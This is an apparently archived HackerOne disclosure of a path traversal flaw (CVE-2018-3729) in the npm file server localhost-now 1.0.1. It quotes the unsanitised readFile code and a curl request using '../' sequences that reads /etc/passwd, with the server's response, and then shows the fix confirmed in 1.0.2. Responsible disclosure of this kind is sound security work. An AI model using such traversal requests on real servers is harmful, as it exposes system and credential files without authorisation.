---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/path-traversal
  - env/web
  - stack/node
  - vuln/path-traversal
substate: "resolved"
weakness: "Path Traversal"
enriched: true
body: true
date: 2018-02-26
submitted: 2018-02-06T14:08:47.103Z
bounty_usd: null
votes: 9
cve: "CVE-2018-3729"
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "bl4de"
source: "https://hackerone.com/reports/312889"
title: "[localhost-now] Path Traversal allows to read content of arbitrary file"
---
# [localhost-now] Path Traversal allows to read content of arbitrary file

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 9 | **Program:** Node.js third-party modules | **Disclosed:** 2018-02-26

- Report: [https://hackerone.com/reports/312889](https://hackerone.com/reports/312889)
- CWE: Path Traversal | CVE: CVE-2018-3729
- Submitted: 2018-02-06T14:08:47.103Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hi Guys,

There is Path Traversal in localhost-now module.
It allows to read content of arbitrary files on the remote server.

## Module

**localhost-now**

This is a general file server made by nodejs. It will be easy for you to access the files on the server through the browser.

https://www.npmjs.com/package/localhost-now

version: 1.0.1

Stats
0 downloads in the last day
24 downloads in the last week
89 downloads in the last month

~1100 estimated downloads per year


## Description

Lack of file path sanitization causes that any file on the server might be read by malicious user:

```javascript
// node_modules/localhost-now/lib/app.js, line 10:
    var url = req.url;

    if (url.indexOf('?') != -1) {
        url = url.split('?')[0];
    }

    var file = url === "/" ? "/index.html" : url;

    fs.readFile(path.normalize(process.cwd()) + file, function(err, data) {

```
Path is read directly from request and used to read content of file without checking against Path Traversal attempt.

## Steps To Reproduce:


- install ```localhost-now```:

```
$ npm install localhost-now
```

- run ```localhost-now``` in direcotry of your choice:

```
me:~/playground/hackerone/Node$ ./node_modules/localhost-now/bin/localhost 
Web Server started on localhost:1337
```

- execute following ```curl``` command (adjust number of ../ to reflect your system):

```
$ curl -v --path-as-is http://127.0.0.1:8080/../../../../../../etc/passwd
```

- see result:

```
*   Trying ::1...
* Connected to localhost (::1) port 1337 (#0)
> GET /../../../../../etc/passwd HTTP/1.1
> Host: localhost:1337
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< content-type: text/
< Date: Tue, 06 Feb 2018 14:06:55 GMT
< Connection: keep-alive
< Content-Length: 2615
< 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
(...)
```

## Supporting Material/References:


- Ubuntu 16.04 LTS
- Chromium 66.0.3333.0 (Developer Build) (64-bit) 
- Node.js version: v8.9.4 LTS
- npm version: 5.6.0
- curl 7.47.0


Please feel free to invite module maintainer to this report. I haven't contacted maintainer as I want to keep the process of fixing and disclosing bug consistent through HackerOne platform only.

I hope my report will help to keep Node.js ecosystem and its users safe in the future.

Regards,

Rafal 'bl4de' Janicki

## Impact

This vulnerability might be used to read content of any file on the server where module is run

## Timeline

- **Report Filed**
- **2018-02-07** @lirantal: Hi @bl4de ,

Thanks for reporting this issue.

I was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.
I will invite the package maintainer to this issue.
- **Changed Scope**
- **Report Severity Updated**
- **Report Triaged**
- **Cve Id Added**
- **2018-02-14** @lirantal: Since the author didn't join the report I opened a security issue in the repo.
- **2018-02-26** @lirantal: @bl4de can you confirm the newly released version from the author fixes the problem?
- **2018-02-26** @bl4de: Hi @lirantal 

Yes, I can confirm I can't reproduce this issue in 1.0.2:

```
$ curl -v --path-as-is http://127.0.0.1:1337/../../../../../etc/passwd
*   Trying 127.0.0.1...
* TCP_NODELAY set
* Connected to 127.0.0.1 (127.0.0.1) port 1337 (#0)
> GET /../../../../../etc/passwd HTTP/1.1
> Host: 127.0.0.1:1337
> User-Agent: curl/7.54.0
> Accept: */*
>
< HTTP/1.1 404 Not Found
< Date: Mon, 26 Feb 2018 21:00:02 GMT
< Connection: keep-alive
< Transfer-Encoding: chunked
<
* Connection #0 to host 127.0.0.1 left intact
```
- **2018-02-26** @lirantal: Great thanks. I'll proceed with a forced public disclosure then.
- **Report Resolved**
- **Agreed On Going Public**
- **Manually Disclosed**
